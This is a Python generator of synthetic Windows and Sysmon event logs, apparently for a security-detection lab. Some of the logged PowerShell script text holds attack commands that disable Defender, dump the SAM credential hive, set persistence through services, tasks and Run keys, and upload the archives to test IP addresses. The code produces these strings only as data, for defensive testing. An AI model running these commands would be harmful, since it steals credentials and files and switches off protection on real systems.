from __future__ import annotations

import hashlib
import random
from datetime import datetime, timedelta

from .catalog import CASES, VARIANTS, BASE, target_name, _incident_variables, materialize_incident

PROCESSES = ["svchost.exe", "explorer.exe", "RuntimeBroker.exe", "SearchHost.exe", "StartMenuExperienceHost.exe", "OneDrive.exe", "msedge.exe", "chrome.exe", "MsMpEng.exe", "Teams.exe", "WINWORD.EXE", "taskhostw.exe", "conhost.exe", "dllhost.exe", "services.exe", "lsass.exe", "powershell.exe"]
SERVICES = ["WindowsUpdate", "GoogleUpdateService", "EdgeUpdate", "OfficeUpdateTask", "AdobeUpdateService", "WindowsSearch", "BITS", "CryptSvc", "W32Time", "DoSvc", "WpnService"]
TYPES = ["process_start", "process_exit", "network_activity", "registry_value_set", "service_state_change", "service_modified", "scheduled_task_action", "logon_success", "dns_query", "file_activity"]
TYPE_WEIGHTS = [24, 7, 17, 12, 7, 9, 7, 6, 7, 4]
PUBLIC_PROVIDER = {"process_start":"Microsoft-Windows-Sysmon", "process_exit":"Microsoft-Windows-Sysmon", "network_activity":"Microsoft-Windows-Sysmon", "registry_value_set":"Microsoft-Windows-Sysmon", "service_state_change":"Service Control Manager", "service_modified":"Service Control Manager", "scheduled_task_action":"Microsoft-Windows-TaskScheduler", "logon_success":"Microsoft-Windows-Security-Auditing", "dns_query":"Microsoft-Windows-Sysmon", "file_activity":"Microsoft-Windows-Sysmon"}
EVENT_CODES = {"process_start":"1", "process_exit":"5", "network_activity":"3", "registry_value_set":"13", "service_state_change":"7036", "service_modified":"7040", "scheduled_task_action":"106", "logon_success":"4624", "dns_query":"22", "file_activity":"11"}
CASE_2_DESTINATION_IPS = {
    "A":"27.133.154.218",
    "B":"178.62.3.223",
    "C":"34.204.119.63",
    "D":"50.16.16.211",
    "E":"162.243.103.246",
}


def special_event_id(case: dict, variant: str, suffix: str) -> str:
    digest=hashlib.blake2s(f"{case['id']}:{variant}:{suffix}".encode(),digest_size=6).hexdigest()
    return f"{case['id']}-{variant}-evt-{digest}"


def transition_event_id(case: dict, variant: str, transition_id: str) -> str:
    return special_event_id(case, variant, f"csg-transition-{transition_id}")


def _record(event_id: str, when, host: str, event_code: str, kind: str, provider: str, object_key: str, normalized: dict, raw: dict | None = None, provenance: str = "generated") -> dict:
    process=normalized.get("process",{}).get("name")
    service=normalized.get("service",{}).get("name")
    reg=normalized.get("registry",{}).get("key")
    raw=raw or {"agent":{"id":"lab-01","name":host},"data":{"win":{"system":{"eventID":event_code,"providerName":provider,"systemTime":when.isoformat().replace("+00:00","Z")},"eventdata":normalized}}}
    default_rule={"id":str(100000+(int(event_id[-5:],16) if all(c in "0123456789abcdef" for c in event_id[-5:].lower()) else 1)),"level":3}
    normalized={**normalized,"timestamp":when.isoformat(),"event":{"id":event_code,"type":kind,"category":kind.split("_")[0]},"host":{"name":host},"rule":{**default_rule,**normalized.get("rule",{})},"message":normalized.get("message",kind.replace("_"," "))}
    terms=" ".join(str(v) for v in [event_id,event_code,kind,provider,host,object_key,normalized])
    return {"id":event_id,"timestamp":when,"host_name":host,"event_code":event_code,"event_type":kind,"provider":provider,"object_key":object_key,"service_name":service,"process_name":process,"registry_key":reg,"normalized":normalized,"raw":raw,"search_text":terms,"provenance":provenance}


def _transition_event(case: dict, variant: str, transition: dict, variables: dict) -> dict:
    action=transition["transition"]
    category=transition["category"]
    when=datetime.fromisoformat(transition["observed_at"])
    key=transition["object_key"]
    before=transition["before"] or {}
    after=transition["after"] or {}
    process_name=variables.get("process","services.exe")
    pid=int((after or before).get("pid",variables.get("pid",4160)))
    image_path=(after or before).get("executable_path",variables.get("image_path", "C:\\Program Files\\Lab\\agent.exe"))
    if category=="service":
        old=str(before.get("start_mode", "manual")).title()
        new=str(after.get("start_mode", old.casefold())).title()
        name=variables["service"]
        code,kind,provider="7040","service_modified","Service Control Manager"
        norm={"service":{"name":name,"old_start_mode":old,"new_start_mode":new,"binary_path":image_path},"process":{"name":"services.exe","pid":680},"message":f"Start type changed for {name}"}
    elif category=="process":
        exiting=action=="EXIT"
        code,kind,provider=("5","process_exit","Microsoft-Windows-Sysmon") if exiting else ("1","process_start","Microsoft-Windows-Sysmon")
        process_name=after.get("name",before.get("name",process_name))
        process_fields={**before,**after}
        norm={"process":{**process_fields,"name":process_name,"pid":pid,"parent":after.get("parent",before.get("parent","services.exe")),"ppid":int(after.get("ppid",before.get("ppid",680))),"executable_path":image_path,"command_line":after.get("command_line",before.get("command_line",image_path))},"user":{"name":"NT AUTHORITY\\SYSTEM"},"message":("Process terminated" if exiting else f"Process Create: {process_name}")}
    elif category=="listener":
        if action != "OPEN":
            raise ValueError(f"No independent Windows telemetry mapping is configured for listener {action}")
        code,kind,provider="5154","network_activity","Microsoft-Windows-Security-Auditing"
        port=int(after.get("local_port",variables["port"]))
        listener_pid=int(after.get("pid",pid))
        listener_name=after.get("process_name",process_name)
        listener_path=after.get("executable_path",image_path)
        norm={"listener":{"protocol":"tcp","local_address":after.get("local_address","0.0.0.0"),"local_port":port,"pid":listener_pid,"process_name":listener_name,"executable_path":listener_path,"operation":"open"},"process":{"name":listener_name,"pid":listener_pid,"executable_path":listener_path},"message":f"Windows Filtering Platform permitted {listener_name} to listen on TCP {port}"}
    elif category=="scheduled_task":
        code,kind,provider="106","scheduled_task_created","Microsoft-Windows-TaskScheduler"
        norm={"task":{"name":after["task_name"],"action":after["action"],"run_as":after["run_as"]},"process":{"name":"taskschd.exe","pid":680},"message":f"Task registered: {after['task_name']}"}
    elif category=="registry_autorun":
        code,kind,provider="13","registry_value_set","Microsoft-Windows-Sysmon"
        attrs=after
        full_key=attrs["registry_key"]+"\\"+attrs["value_name"]
        norm={"registry":{"key":full_key,"value_name":attrs["value_name"],"value_data":attrs["value_data"]},"process":{"name":process_name,"pid":pid,"executable_path":image_path},"user":{"name":"NT AUTHORITY\\SYSTEM"},"message":f"Registry value set: {full_key}"}
        raw={"agent":{"id":"lab-redacted","name":variables["host"]},"data":{"win":{"system":{"providerName":provider,"eventID":code,"channel":"Microsoft-Windows-Sysmon/Operational","systemTime":when.isoformat().replace("+00:00","Z")},"eventdata":{"eventType":"SetValue","utcTime":when.isoformat(sep=" ",timespec="milliseconds"),"processGuid":"{00000000-0000-0000-0000-000000000042}","processId":str(pid),"image":image_path,"targetObject":full_key,"details":attrs["value_data"],"user":"NT AUTHORITY\\SYSTEM"}}}}
    else:
        raise ValueError(f"No Wazuh record mapping for CSG transition category {category}")
    return _record(transition_event_id(case,variant,transition["id"]),when,variables["host"],code,kind,provider,key,norm,raw if category=="registry_autorun" else None,"redacted_research_structure" if category=="registry_autorun" else "generated")


def _add_at(case: dict, variant: str, suffix: str, seconds: int, event_code: str, kind: str, provider: str, host: str, object_key: str, normalized: dict, host_override: str | None=None) -> dict:
    when=BASE+timedelta(seconds=seconds)
    actual_host=host_override or host
    return _record(special_event_id(case,variant,suffix),when,actual_host,event_code,kind,provider,object_key,normalized)


def _incident_distractors(case: dict, variant: str, variables: dict) -> list[dict]:
    incident=case["incident"]
    host=variables["host"]
    service=variables["service"]
    process=variables.get("process","svchost.exe")
    path=variables.get("image_path", "C:\\Program Files\\Lab\\agent.exe")
    pid=int(variables.get("pid",4160))
    configured_offsets=incident.get("distractor_offsets",{})
    rows=[]
    for item in incident.get("telemetry_distractors",[]):
        suffix=item["id"]
        if item["type"]=="task":
            offset=int(configured_offsets.get("task",2260))
            name=variables["task"]+"-Telemetry"
            norm={"task":{"name":name,"action":path+" --stage","run_as":"SYSTEM"},"process":{"name":"taskschd.exe","pid":680},"message":f"Task registered: {name}"}
            rows.append(_add_at(case,variant,suffix,offset,"106","scheduled_task_created","Microsoft-Windows-TaskScheduler",host,f"task:{name.casefold()}",norm))
            wrong_host_norm={**norm,"task":{"name":variables["task"],"action":path+" --stage","run_as":"SYSTEM"},"message":f"Task registered: {variables['task']}"}
            rows.append(_add_at(case,variant,suffix+"-wrong-host",offset+2,"106","scheduled_task_created","Microsoft-Windows-TaskScheduler",host,f"task:{variables['task'].casefold()}",wrong_host_norm,"WIN-OPS-07"))
        elif item["type"]=="registry":
            offset=int(configured_offsets.get("registry",2280))
            value=variables["registry_value"]
            key=f"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{value}"
            norm={"registry":{"key":key,"value_name":value,"value_data":path+".old"},"process":{"name":process,"pid":pid},"message":f"Registry value set: {key}"}
            rows.append(_add_at(case,variant,suffix,offset,"13","registry_value_set","Microsoft-Windows-Sysmon",host,f"registry:{key.casefold()}",norm))
            rows.append(_add_at(case,variant,suffix+"-wrong-host",offset+3,"13","registry_value_set","Microsoft-Windows-Sysmon",host,f"registry:{key.casefold()}",{**norm,"registry":{"key":key,"value_name":value,"value_data":path}},"WIN-OPS-07"))
        elif item["type"]=="service":
            offset=int(configured_offsets.get("service",2228))
            # Same-host service activity at a similar time, but on a different service identity.
            other=service+"Helper"
            norm={"service":{"name":other,"old_start_mode":"Manual","new_start_mode":"Automatic","binary_path":path},"process":{"name":"services.exe","pid":680},"message":f"Start type changed for {other}"}
            rows.append(_add_at(case,variant,suffix,offset,"7040","service_modified","Service Control Manager",host,f"service:{other.casefold()}",norm))
        elif item["type"]=="process":
            offset=int(item.get("offset_seconds",configured_offsets.get("process",2243)))
            pid_source=item.get("pid_source","pid")
            wrong_pid=int(variables.get(pid_source,pid))+int(item.get("pid_offset",1))
            parent=item.get("parent","services.exe")
            ppid=int(variables.get("ppid_source",pid)) if item.get("ppid_source") else int(item.get("ppid",680))
            command_line=item.get("command_line")
            if not command_line:
                command_line=item.get("command_line_template",path+" --stage").format(**variables)
            norm={"process":{"name":process,"pid":wrong_pid,"parent":parent,"ppid":ppid,"executable_path":path,"command_line":command_line},"user":{"name":"NT AUTHORITY\\SYSTEM"},"message":f"Process Create: {process}"}
            rows.append(_add_at(case,variant,suffix,offset,"1","process_start","Microsoft-Windows-Sysmon",host,f"process:{wrong_pid}:{process.casefold()}",norm))
        elif item["type"]=="listener":
            offset=int(configured_offsets.get("listener",2248))
            port=int(variables["port"])
            wrong_pid=pid+1
            norm={"listener":{"protocol":"tcp","local_address":"0.0.0.0","local_port":port,"pid":wrong_pid,"process_name":"svchost.exe","operation":"open"},"process":{"name":"svchost.exe","pid":wrong_pid},"message":f"Windows Filtering Platform permitted svchost.exe to listen on TCP {port}"}
            rows.append(_add_at(case,variant,suffix,offset,"5154","network_activity","Microsoft-Windows-Security-Auditing",host,f"listener:tcp:0.0.0.0:{port}",norm))
    return rows


def malicious_context_events(case: dict, variant: str) -> list[dict]:
    """Create malicious telemetry correlated to the CSG objects under study.

    Script content names the changed service or persistence object where one is
    relevant. Process ancestry, exact paths, and host/time connect the activity
    across the two evidence sources without pretending a script proves execution.
    """
    variables=_incident_variables(case,variant)
    variables["target"]=target_name(case,variant)
    host=variables["host"]
    service=variables.get("service",variables["target"])
    service_path=variables.get("image_path",f"C:\\Program Files\\{service}\\agent.exe").replace("{target}",service)
    pid=int(variables.get("pid",6100+(ord(variant)-65)*100))
    case_id=case["id"]
    if case_id=="case-01":
        minute,second=54,10
        script=(f"sc.exe config {service} start= auto; "
                "Set-MpPreference -DisableRealtimeMonitoring $true; "
                "reg.exe save HKLM\\SAM C:\\ProgramData\\CsgLab\\Cache\\sam.hiv; "
                "Compress-Archive C:\\ProgramData\\CsgLab\\Cache\\sam.hiv C:\\ProgramData\\CsgLab\\Cache\\update.zip; "
                "Invoke-WebRequest -Uri https://198.51.100.44/collect -Method Post -InFile C:\\ProgramData\\CsgLab\\Cache\\update.zip")
        artifact="C:\\ProgramData\\CsgLab\\Cache\\update.zip"
        message=f"PowerShell configured {service} for automatic startup, disabled Defender, staged the SAM hive, and posted the archive to a test network address"
    elif case_id=="case-02":
        minute,second=51,20
        destination_ip=CASE_2_DESTINATION_IPS[variant]
        script=("sc.exe stop CsgTelemetryForwarder; "
                f"sc.exe config {service} start= auto; "
                "sc.exe start CsgTelemetryForwarder; "
                "Set-MpPreference -DisableRealtimeMonitoring $true; "
                "Compress-Archive -Path C:\\Users\\*\\Documents\\*.pdf -DestinationPath C:\\ProgramData\\CsgLab\\Cache\\reports.zip; "
                f"Invoke-WebRequest -Uri https://{destination_ip}/collect -Method Post -InFile C:\\ProgramData\\CsgLab\\Cache\\reports.zip")
        artifact="C:\\ProgramData\\CsgLab\\Cache\\reports.zip"
        message=f"PowerShell stopped the lab-only telemetry forwarder, requested automatic startup for {service}, restored forwarding, then disabled Defender, staged user documents, and posted the archive to a test network address"
    elif case_id=="case-03":
        minute,second=37,31
        action=f"{variables['image_path']} --inventory"
        create_task=f'schtasks.exe /Create /TN "{variables["task"]}" /TR "{action}" /SC ONSTART /RU SYSTEM /F'
        script=(create_task+"; "
                "Set-MpPreference -DisableRealtimeMonitoring $true; "
                "reg.exe save HKLM\\SAM C:\\ProgramData\\CsgLab\\Cache\\account.hiv; "
                "Compress-Archive C:\\ProgramData\\CsgLab\\Cache\\account.hiv C:\\ProgramData\\CsgLab\\Cache\\inventory.zip; "
                "Invoke-WebRequest -Uri https://198.51.100.46/collect -Method Post -InFile C:\\ProgramData\\CsgLab\\Cache\\inventory.zip")
        artifact="C:\\ProgramData\\CsgLab\\Cache\\inventory.zip"
        message=f"PowerShell requested the case task {variables['task']} with the CSG-recorded executable action, disabled Defender, staged the SAM hive, and posted the archive to a test network address"
    elif case_id=="case-04":
        return staged_relay_context_events(case,variant,variables)
    else:
        minute,second=37,33
        action=f"{variables['image_path']} --stage"
        create_task=f'schtasks.exe /Create /TN "{variables["task"]}" /TR "{action}" /SC ONSTART /RU SYSTEM /F'
        set_run=(f"New-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
                 f"-Name '{variables['registry_value']}' -Value '{action}' -PropertyType String -Force")
        script=(create_task+"; "+set_run+"; "
                "Set-MpPreference -DisableRealtimeMonitoring $true; "
                "Compress-Archive -Path C:\\Users\\*\\Documents\\*.pdf -DestinationPath C:\\ProgramData\\CsgLab\\Cache\\telemetry.zip; "
                "Invoke-WebRequest -Uri https://198.51.100.47/collect -Method Post -InFile C:\\ProgramData\\CsgLab\\Cache\\telemetry.zip")
        artifact="C:\\ProgramData\\CsgLab\\Cache\\telemetry.zip"
        message=f"PowerShell requested the case task {variables['task']} and Run value {variables['registry_value']} with the CSG-recorded executable action, disabled Defender, staged user documents, and posted the archive to a test network address"

    when=BASE+timedelta(minutes=minute,seconds=second)
    ps_pid=pid+20
    scriptblock_id=f"{{00000000-0000-0000-0000-{pid:012d}}}"
    rule={"id":"110901","level":12,"description":"PowerShell alters persistence, disables Defender, stages data, and sends an outbound archive", "groups":["windows","powershell","defense_evasion","persistence","exfiltration","csg_lab"]}
    def raw(code,provider,at,data):
        return {"agent":{"id":f"lab-{variant.lower()}","name":host},"manager":{"name":"wazuh-manager"},"rule":rule if code=="4104" else {"id":"100100","level":5,"description":provider+" event"},"decoder":{"name":"windows_eventchannel"},"location":"EventChannel","timestamp":at.isoformat(),"data":{"win":{"system":{"eventID":code,"providerName":provider,"channel":provider+"/Operational","systemTime":at.isoformat().replace("+00:00","Z"),**({"processID":str(ps_pid)} if code=="4104" else {})},"eventdata":data}}}
    rows=[]
    if case_id in {"case-01","case-02"}:
        parent_at=when-timedelta(seconds=8)
        parent={"process":{"name":"agent.exe","pid":pid,"parent":"services.exe","ppid":680,"executable_path":service_path,"command_line":service_path},"user":{"name":"NT AUTHORITY\\SYSTEM"},"message":f"Service image started: {service}"}
        rows.append(_record(special_event_id(case,variant,"malicious-service-process"),parent_at,host,"1","process_start","Microsoft-Windows-Sysmon",f"process:{pid}:agent.exe",parent,provenance="synthetic_attack_context"))
    ps_at=when
    ps_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    ps_start={"process":{"name":"powershell.exe","pid":ps_pid,"parent":("agent.exe" if case_id in {"case-01","case-02"} else variables["process"]),"ppid":pid,"executable_path":ps_path,"command_line":f'powershell.exe -NoProfile -Command "{script}"'},"user":{"name":"NT AUTHORITY\\SYSTEM"},"message":"PowerShell started as a child of the case service process"}
    rows.append(_record(special_event_id(case,variant,"malicious-powershell-start"),ps_at,host,"1","process_start","Microsoft-Windows-Sysmon",f"process:{ps_pid}:powershell.exe",ps_start,provenance="synthetic_attack_context"))

    block_at=ps_at+timedelta(seconds=4)
    block={"process":{"name":"powershell.exe","pid":ps_pid,"executable_path":ps_path},"powershell":{"script_block_id":scriptblock_id,"script_block_text":script},"user":{"name":"NT AUTHORITY\\SYSTEM"},"rule":rule,"message":message}
    block_raw=raw("4104","Microsoft-Windows-PowerShell",block_at,{"ScriptBlockId":scriptblock_id,"ScriptBlockText":script,"Path":"C:\\ProgramData\\CsgLab\\Stage\\inventory.ps1"})
    rows.append(_record(special_event_id(case,variant,"malicious-script-block"),block_at,host,"4104","powershell_script_block","Microsoft-Windows-PowerShell",f"process:{ps_pid}:powershell.exe",block,block_raw,"synthetic_attack_context"))

    follow_on_delay=17 if case_id=="case-02" else 7
    defender_at=ps_at+timedelta(seconds=follow_on_delay)
    defense={"defender":{"setting":"DisableRealtimeMonitoring","old_value":"false","new_value":"true"},"message":"Microsoft Defender configuration changed: real-time monitoring disabled"}
    defense_raw=raw("5007","Microsoft-Windows-Windows Defender",defender_at,{"Name":"DisableRealtimeMonitoring","OldValue":"false","NewValue":"true"})
    rows.append(_record(special_event_id(case,variant,"malicious-defender-change"),defender_at,host,"5007","defender_configuration_changed","Microsoft-Windows-Windows Defender","defender:disablerealtimemonitoring",defense,defense_raw,"synthetic_attack_context"))

    file_at=ps_at+timedelta(seconds=follow_on_delay+3)
    file_event={"process":{"name":"powershell.exe","pid":ps_pid,"executable_path":ps_path},"file":{"path":artifact,"operation":"created"},"message":f"PowerShell created staged archive {artifact}"}
    file_raw=raw("11","Microsoft-Windows-Sysmon",file_at,{"Image":ps_path,"ProcessId":str(ps_pid),"TargetFilename":artifact,"CreationUtcTime":file_at.isoformat().replace("+00:00","Z")})
    rows.append(_record(special_event_id(case,variant,"malicious-archive-created"),file_at,host,"11","file_activity","Microsoft-Windows-Sysmon",f"file:{artifact.casefold()}",file_event,file_raw,"synthetic_attack_context"))

    net_at=ps_at+timedelta(seconds=follow_on_delay+6)
    address=CASE_2_DESTINATION_IPS[variant] if case_id=="case-02" else {"case-01":"198.51.100.44","case-03":"198.51.100.46","case-04":"198.51.100.48","case-final":"198.51.100.47"}[case_id]
    network={"process":{"name":"powershell.exe","pid":ps_pid,"executable_path":ps_path},"destination":{"ip":address,"port":443},"network":{"transport":"tcp","direction":"outbound","operation":"connection_established"},"message":f"PowerShell opened an outbound TLS connection to {address}:443 after staging data"}
    net_raw=raw("3","Microsoft-Windows-Sysmon",net_at,{"Image":ps_path,"ProcessId":str(ps_pid),"DestinationIp":address,"DestinationPort":"443","Protocol":"tcp","Initiated":"true"})
    rows.append(_record(special_event_id(case,variant,"malicious-outbound-connection"),net_at,host,"3","network_activity","Microsoft-Windows-Sysmon",f"network:outbound:{address}:443",network,net_raw,"synthetic_attack_context"))
    return rows


def staged_relay_context_events(case: dict, variant: str, variables: dict) -> list[dict]:
    """Build the two malicious script stages that connect the A→B and B→C deltas."""
    host=variables["host"]
    service=variables["service"]
    process=variables["process"]
    image=variables["image_path"]
    pid=int(variables["pid"])
    task=variables["task"]
    port=int(variables["port"])
    bootstrap_pid=pid-30
    child_pid=int(variables.get("script_pid",pid+20))
    ps_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    stage_a=BASE+timedelta(minutes=39,seconds=18)
    stage_b=BASE+timedelta(minutes=68,seconds=50)
    stage_a_script=f"sc.exe config {service} start= auto; sc.exe start {service}"
    task_action=f'{image} --serve {port}'
    stage_b_script=(f'schtasks.exe /Create /TN "{task}" /TR "{task_action}" /SC ONSTART /RU SYSTEM /F; '
                    f'Start-Process -FilePath "{image}" -ArgumentList "--serve {port}"; '
                    "Set-MpPreference -DisableRealtimeMonitoring $true; "
                    "Compress-Archive -Path C:\\ProgramData\\CsgLab\\Cache\\* -DestinationPath C:\\ProgramData\\CsgLab\\Cache\\support.zip; "
                    "Invoke-WebRequest -Uri https://198.51.100.48/collect -Method Post -InFile C:\\ProgramData\\CsgLab\\Cache\\support.zip")
    rule={"id":"110904","level":12,"description":"PowerShell establishes persistence, exposes a listener, disables Defender, and stages data","groups":["windows","powershell","defense_evasion","persistence","exfiltration","csg_lab"]}

    def raw(code: str, provider: str, at, eventdata: dict, process_id: int | None=None) -> dict:
        system={"eventID":code,"providerName":provider,"channel":provider+"/Operational","systemTime":at.isoformat().replace("+00:00","Z")}
        if process_id is not None: system["processID"]=str(process_id)
        event_rule=rule if code=="4104" else {"id":"100100","level":5,"description":provider+" event"}
        return {"agent":{"id":f"lab-{variant.lower()}","name":host},"manager":{"name":"wazuh-manager"},"rule":event_rule,"decoder":{"name":"windows_eventchannel"},"location":"EventChannel","timestamp":at.isoformat(),"data":{"win":{"system":system,"eventdata":eventdata}}}

    rows=[]
    logon_at=stage_a-timedelta(seconds=13)
    logon={"user":{"name":"LAB\\svc_maint"},"source":{"ip":"10.24.8.44"},"logon":{"type":3,"authentication_package":"Kerberos"},"message":"A network logon established a maintenance session"}
    rows.append(_record(special_event_id(case,variant,"relay-maintenance-logon"),logon_at,host,"4624","logon_success","Microsoft-Windows-Security-Auditing","user:lab\\svc_maint",logon,raw("4624","Microsoft-Windows-Security-Auditing",logon_at,{"TargetUserName":"svc_maint","LogonType":"3","IpAddress":"10.24.8.44","AuthenticationPackageName":"Kerberos"}),"synthetic_attack_context"))

    bootstrap_at=stage_a-timedelta(seconds=4)
    bootstrap={"process":{"name":"powershell.exe","pid":bootstrap_pid,"parent":"wsmprovhost.exe","ppid":912,"executable_path":ps_path,"command_line":"powershell.exe -NoProfile -NonInteractive -Command <maintenance script>"},"user":{"name":"LAB\\svc_maint"},"message":"PowerShell started inside a remote maintenance session"}
    rows.append(_record(special_event_id(case,variant,"relay-stage-a-process"),bootstrap_at,host,"1","process_start","Microsoft-Windows-Sysmon",f"process:{bootstrap_pid}:powershell.exe",bootstrap,raw("1","Microsoft-Windows-Sysmon",bootstrap_at,{"ProcessId":str(bootstrap_pid),"Image":ps_path,"ParentImage":"C:\\Windows\\System32\\wsmprovhost.exe","ParentProcessId":"912","CommandLine":bootstrap["process"]["command_line"]}),"synthetic_attack_context"))
    block_a={"process":{"name":"powershell.exe","pid":bootstrap_pid,"executable_path":ps_path},"powershell":{"script_block_id":f"{{00000000-0000-0000-0000-{bootstrap_pid:012d}}}","script_block_text":stage_a_script},"user":{"name":"LAB\\svc_maint"},"rule":rule,"message":f"Maintenance PowerShell changes {service} startup and starts its service image"}
    rows.append(_record(special_event_id(case,variant,"stage-a-script-block"),stage_a,host,"4104","powershell_script_block","Microsoft-Windows-PowerShell",f"process:{bootstrap_pid}:powershell.exe",block_a,raw("4104","Microsoft-Windows-PowerShell",stage_a+timedelta(seconds=2),{"ScriptBlockId":block_a["powershell"]["script_block_id"],"ScriptBlockText":stage_a_script,"Path":"C:\\ProgramData\\CsgLab\\Stage\\maintenance.ps1"},bootstrap_pid),"synthetic_attack_context"))

    child_at=stage_b-timedelta(seconds=5)
    child={"process":{"name":"powershell.exe","pid":child_pid,"parent":process,"ppid":pid,"executable_path":ps_path,"command_line":"powershell.exe -NoProfile -NonInteractive -File C:\\ProgramData\\CsgLab\\Stage\\relay.ps1"},"user":{"name":"NT AUTHORITY\\SYSTEM"},"message":f"PowerShell started as a child of the {service} service image"}
    rows.append(_record(special_event_id(case,variant,"relay-stage-b-process"),child_at,host,"1","process_start","Microsoft-Windows-Sysmon",f"process:{child_pid}:powershell.exe",child,raw("1","Microsoft-Windows-Sysmon",child_at,{"ProcessId":str(child_pid),"Image":ps_path,"ParentImage":image,"ParentProcessId":str(pid),"CommandLine":child["process"]["command_line"]}),"synthetic_attack_context"))
    block_b={"process":{"name":"powershell.exe","pid":child_pid,"executable_path":ps_path,"parent_pid":pid},"powershell":{"script_block_id":f"{{00000000-0000-0000-0000-{child_pid:012d}}}","script_block_text":stage_b_script},"user":{"name":"NT AUTHORITY\\SYSTEM"},"rule":rule,"message":f"PowerShell registers {task}, launches its service image as a listener, disables Defender, stages files, and attempts an outbound transfer"}
    rows.append(_record(special_event_id(case,variant,"stage-b-script-block"),stage_b,host,"4104","powershell_script_block","Microsoft-Windows-PowerShell",f"process:{child_pid}:powershell.exe",block_b,raw("4104","Microsoft-Windows-PowerShell",stage_b+timedelta(seconds=2),{"ScriptBlockId":block_b["powershell"]["script_block_id"],"ScriptBlockText":stage_b_script,"Path":"C:\\ProgramData\\CsgLab\\Stage\\relay.ps1"},child_pid),"synthetic_attack_context"))

    defender_at=stage_b+timedelta(seconds=9)
    defense={"defender":{"setting":"DisableRealtimeMonitoring","old_value":"false","new_value":"true"},"message":"Microsoft Defender configuration changed: real-time monitoring disabled"}
    rows.append(_record(special_event_id(case,variant,"relay-defender-change"),defender_at,host,"5007","defender_configuration_changed","Microsoft-Windows-Windows Defender","defender:disablerealtimemonitoring",defense,raw("5007","Microsoft-Windows-Windows Defender",defender_at,{"Name":"DisableRealtimeMonitoring","OldValue":"false","NewValue":"true"}),"synthetic_attack_context"))
    artifact="C:\\ProgramData\\CsgLab\\Cache\\support.zip"
    file_at=stage_b+timedelta(seconds=12)
    file={"process":{"name":"powershell.exe","pid":child_pid,"executable_path":ps_path},"file":{"path":artifact,"operation":"created"},"message":f"PowerShell created staged archive {artifact}"}
    rows.append(_record(special_event_id(case,variant,"relay-archive-created"),file_at,host,"11","file_activity","Microsoft-Windows-Sysmon",f"file:{artifact.casefold()}",file,raw("11","Microsoft-Windows-Sysmon",file_at,{"Image":ps_path,"ProcessId":str(child_pid),"TargetFilename":artifact}),"synthetic_attack_context"))
    destination="198.51.100.48"
    network_at=stage_b+timedelta(seconds=15)
    network={"process":{"name":"powershell.exe","pid":child_pid,"executable_path":ps_path},"destination":{"ip":destination,"port":443},"network":{"transport":"tcp","direction":"outbound","operation":"connection_established"},"message":f"PowerShell opened an outbound TLS connection to {destination}:443 after staging data"}
    rows.append(_record(special_event_id(case,variant,"relay-outbound-connection"),network_at,host,"3","network_activity","Microsoft-Windows-Sysmon",f"network:outbound:{destination}:443",network,raw("3","Microsoft-Windows-Sysmon",network_at,{"Image":ps_path,"ProcessId":str(child_pid),"DestinationIp":destination,"DestinationPort":"443","Protocol":"tcp","Initiated":"true"}),"synthetic_attack_context"))
    return rows


def case2_telemetry_gap_support_events(case: dict, variant: str) -> list[dict]:
    """Record the forwarder stop/start and a nearby read-only lookalike query."""
    host=VARIANTS[variant]["host"]
    target=target_name(case,variant)
    rows=[]
    for suffix,second,status,description in [
        ("forwarder-stopped",26,"Stopped","The CsgTelemetryForwarder service entered the stopped state"),
        ("forwarder-started",33,"Running","The CsgTelemetryForwarder service entered the running state"),
    ]:
        when=BASE+timedelta(minutes=51,seconds=second)
        norm={"service":{"name":"CsgTelemetryForwarder","state":status},"process":{"name":"services.exe","pid":680},"message":description}
        raw={"agent":{"id":f"lab-{variant.lower()}","name":host},"data":{"win":{"system":{"eventID":"7036","providerName":"Service Control Manager","systemTime":when.isoformat().replace("+00:00","Z")},"eventdata":{"param1":"CsgTelemetryForwarder","param2":status.lower()}}}}
        rows.append(_record(special_event_id(case,variant,suffix),when,host,"7036","service_state_change","Service Control Manager","service:csgtelemetryforwarder",norm,raw,"synthetic_attack_context"))
    when=BASE+timedelta(minutes=51,seconds=16)
    query="Get-Service -Name '"+target+"'; sc.exe qc "+target
    norm={"process":{"name":"powershell.exe","pid":9060,"parent":"taskhostw.exe","ppid":3180,"executable_path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},"powershell":{"script_block_text":query},"user":{"name":"LAB\\svc_inventory"},"message":f"Service inventory check for {target}"}
    raw={"agent":{"id":f"lab-{variant.lower()}","name":host},"data":{"win":{"system":{"eventID":"4104","providerName":"Microsoft-Windows-PowerShell","systemTime":when.isoformat().replace("+00:00","Z")},"eventdata":{"ScriptBlockText":query,"Path":"C:\\ProgramData\\CsgLab\\Stage\\inventory-check.ps1"}}}}
    rows.append(_record(special_event_id(case,variant,"service-query-lookalike"),when,host,"4104","powershell_script_block","Microsoft-Windows-PowerShell","process:9060:powershell.exe",norm,raw,"synthetic_benign_context"))
    return rows


def generate_case_events(case: dict, variant: str) -> list[dict]:
    rng=random.Random(case["noise_seed"]+VARIANTS[variant]["seed_offset"])
    host=VARIANTS[variant]["host"]
    target=target_name(case,variant)
    rows=[]
    for i in range(case.get("minimum_events",15000)):
        minute=rng.randrange(180)
        when=BASE+timedelta(minutes=minute,seconds=rng.randrange(60),milliseconds=rng.randrange(1000))
        kind=rng.choices(TYPES,weights=TYPE_WEIGHTS,k=1)[0]
        process=rng.choice(PROCESSES)
        other_host=rng.random()<0.018
        event_host=f"WIN-OPS-{rng.randrange(1,9):02d}" if other_host else host
        code=EVENT_CODES[kind]
        raw_event=None
        if kind.startswith("service"):
            candidates=SERVICES+[target+"Svc",target.replace("Agent","Updater")]
            # Missing and incident telemetry cases must not acquire accidental exact service matches.
            if case["id"] not in {"case-02","case-03","case-final"}:
                candidates.append(target)
            candidates=[name for name in candidates if name.casefold()!=target.casefold() or case["id"]=="case-01"]
            svc=rng.choice(candidates)
            if kind=="service_state_change":
                state=rng.choice(["Running","Stopped"])
                norm={"service":{"name":svc,"state":state},"process":{"name":"services.exe","pid":rng.randrange(300,7000)},"message":f"The {svc} service entered the {state.lower()} state"}
                event_time=when.isoformat().replace("+00:00","Z")
